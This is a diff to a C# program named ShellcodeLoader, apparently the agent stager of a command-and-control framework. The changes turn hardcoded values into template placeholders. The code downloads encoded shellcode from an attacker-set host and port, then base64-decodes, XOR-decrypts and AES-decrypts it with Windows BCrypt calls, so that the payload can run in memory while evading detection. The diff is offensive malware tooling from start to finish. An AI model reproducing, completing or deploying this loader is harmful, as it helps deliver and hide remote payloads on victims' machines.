@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.IO.MemoryMappedFiles;
@@ -93,6 +93,9 @@ namespace ShellcodeLoader
             WriteCombineModifierflag = 0x400
         }
 
+        public static string host = "<IP>";
+        public static string port = "<PORT>";
+
         static byte[] getterShellcode()
         {
             byte[] shellcode;
@@ -100,14 +103,14 @@ namespace ShellcodeLoader
             using (var client = new WebClient())
             {
                 // Download the shellcode
-                shellcode = client.DownloadData("http://localhost:8081/agents/windows/cs");
+                shellcode = client.DownloadData("http://" + host + ":" + port + "/agents/windows/cs");
             }
 
             // Base64 decoding
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
             // XOR decryption
-			var xorKey = Convert.FromBase64String("Lcj2FmHhZhYHXonXjp3+JyP7y5WPc0QSHgxIimS8SLs="); // XOR key
+			var xorKey = Convert.FromBase64String("#1"); // XOR key
             shellcode = XORDecrypt(shellcode, xorKey);
 
             // AES decryption process
@@ -121,13 +124,13 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptSetProperty failed with status " + ntStatus);
 
-			var key = Convert.FromBase64String("T81DHPDIo1BWcaZRnCFA1yjeIl4c03x/al8l1NPe/mc="); // AES-256 key
+			var key = Convert.FromBase64String("#2"); // AES-256 key
             var hKey = IntPtr.Zero;
             ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
             if (ntStatus != 0)
                 throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);
 
-			var iv = Convert.FromBase64String("dndsvGZaGfhvp/BB4z8fgA=="); // AES IV
+			var iv = Convert.FromBase64String("#3"); // AES IV
             var decryptedShellcode = new byte[shellcode.Length];
             uint decryptedShellcodeSize;
             ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
